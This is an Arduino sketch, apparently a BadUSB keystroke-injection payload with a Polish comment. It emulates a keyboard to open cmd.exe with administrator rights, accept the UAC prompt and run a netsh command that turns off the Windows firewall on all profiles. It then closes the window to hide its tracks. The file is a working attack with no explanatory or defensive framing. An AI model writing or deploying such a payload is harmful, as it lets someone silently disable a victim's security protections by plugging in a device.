#include <Keyboard.h>



void setup() {
  delay(300);
  Keyboard.begin();
  delay(500);

  // owarcie okna cmd
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(50);

  Keyboard.print("cmd.exe");
  delay(30);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("netsh advfirewall set allprofiles state off");
  delay(10);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
